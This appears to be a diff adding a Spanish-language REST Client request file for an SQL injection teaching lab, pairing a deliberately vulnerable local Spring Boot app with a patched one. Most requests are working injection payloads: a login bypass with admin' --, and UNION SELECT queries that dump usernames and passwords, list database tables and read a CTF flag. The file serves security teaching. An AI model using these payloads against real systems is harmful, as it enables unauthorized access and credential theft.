@@ -1,0 +1,50 @@
+# M1 · Inyección SQL
+# Requisitos: extensión REST Client (humao.rest-client) y los perfiles levantados:
+#   .\mvnw.cmd spring-boot:run "-Dspring-boot.run.profiles=vulnerable"   (3000)
+#   .\mvnw.cmd spring-boot:run "-Dspring-boot.run.profiles=patched"      (3001)
+# Clic en "Send Request" encima de cada bloque.
+# Esperado: cada ataque FUNCIONA en @vuln y FALLA en @safe.
+# Ojo: los payloads no llevan ":" ni "?" (Hibernate los toma como parámetros).
+
+@vuln = http://localhost:3000
+@safe = http://localhost:3001
+
+### 0. Login normal (referencia)
+POST {{vuln}}/api/login
+Content-Type: application/json
+
+{"username": "maria", "password": "sunshine"}
+
+### 1a. Ataque: login sin contraseña con  admin' --   → 200 y entra como admin
+POST {{vuln}}/api/login
+Content-Type: application/json
+
+{"username": "admin' --", "password": "cualquiera"}
+
+### 1b. Mismo ataque en la versión segura → 401
+POST {{safe}}/api/login
+Content-Type: application/json
+
+{"username": "admin' --", "password": "cualquiera"}
+
+### 2a. Ataque: una comilla sola → 500 con el error de SQL visible
+GET {{vuln}}/api/products?q='
+
+### 2b. Mismo ataque en la versión segura → 200 y lista vacía
+GET {{safe}}/api/products?q='
+
+### 3a. Ataque: UNION → aparecen usuarios y contraseñas como si fueran productos
+GET {{vuln}}/api/products
+    ?q=' UNION SELECT id, username, password, 0 FROM users --
+
+### 3b. Mismo ataque en la versión segura → 200 y lista vacía
+GET {{safe}}/api/products
+    ?q=' UNION SELECT id, username, password, 0 FROM users --
+
+### Reto CTF (para la casa). Paso 1: listar las tablas de la base
+GET {{vuln}}/api/products
+    ?q=' UNION SELECT 1, TABLE_NAME, '', 0 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='PUBLIC' --
+
+### Reto CTF. Paso 2: leer la bandera
+GET {{vuln}}/api/products
+    ?q=' UNION SELECT id, flag, '', 0 FROM secreto_ctf --
